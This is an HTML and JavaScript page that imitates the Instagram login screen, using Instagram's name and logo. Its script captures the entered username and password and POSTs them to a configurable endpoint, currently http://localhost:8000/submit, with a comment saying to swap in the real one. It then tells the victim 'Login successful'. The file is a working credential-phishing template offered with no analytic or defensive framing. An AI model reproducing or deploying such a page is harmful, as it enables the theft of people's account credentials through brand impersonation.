<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram Login</title>
   <style>
       body {
           font-family: Arial, sans-serif;
           background-color: #fafafa;
           display: flex;
           justify-content: center;
           align-items: center;
           height: 100vh;
           margin: 0;
       }
       .container {
           background-color: white;
           border-radius: 5px;
           width: 300px;
           padding: 40px 30px;
           box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
           text-align: center;
       }
       .header {
           display: flex;
           align-items: center;
           justify-content: center;
       }
       .logo {
           width: 30px; /* Smaller logo size */
           margin-right: 10px; /* Space between logo and title */
       }
       h2 {
           margin: 0;
           font-size: 24px;
       }
       .input-field {
           width: 100%;
           padding: 10px;
           margin: 10px 0;
           border: 1px solid #dbdbdb;
           border-radius: 5px;
           box-sizing: border-box;
       }
       .login-btn {
           width: 100%;
           padding: 10px;
           background-color: #3897f0;
           color: white;
           border: none;
           border-radius: 5px;
           cursor: pointer;
           font-size: 14px;
       }
       .login-btn:hover {
           background-color: #2980b9;
       }
       .forgot-password {
           font-size: 12px;
           margin-top: 10px;
       }
   </style>
</head>
<body>


<div class="container">
   <div class="header">
       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
       <h2>Instagram</h2>
   </div>
   <form id="loginForm">
       <input type="text" class="input-field" name="username" id="username" placeholder="Phone number, email, or username" required>
       <input type="password" class="input-field" name="password" id="password" placeholder="Password" required>
       <button type="submit" class="login-btn">Log In</button>
   </form>
   <div class="forgot-password">
       <a href="#">Forgot password?</a>
   </div>
</div>


<script>
   // JavaScript to send the login data to an API
   document.getElementById("loginForm").addEventListener("submit", function(event) {
       event.preventDefault(); // Prevent the default form submission


       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;


       // Prepare the data to be sent to the API
       const data = {
           username: username,
           password: password
       };


       // Send the data using fetch to an API (replace 'YOUR_API_URL' with the actual endpoint)
       fetch('http://localhost:8000/submit', {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json',
           },
           body: JSON.stringify(data),
       })
       .then(response => response.json()) // Parse the JSON response
       .then(data => {
           // Handle the API response here
           console.log('Success:', data);
           alert('Login successful');
       })
       .catch((error) => {
           // Handle any errors that occur during the fetch
           console.error('Error:', error);
           alert('Login failed');
       });
   });
</script>


</body>
</html>
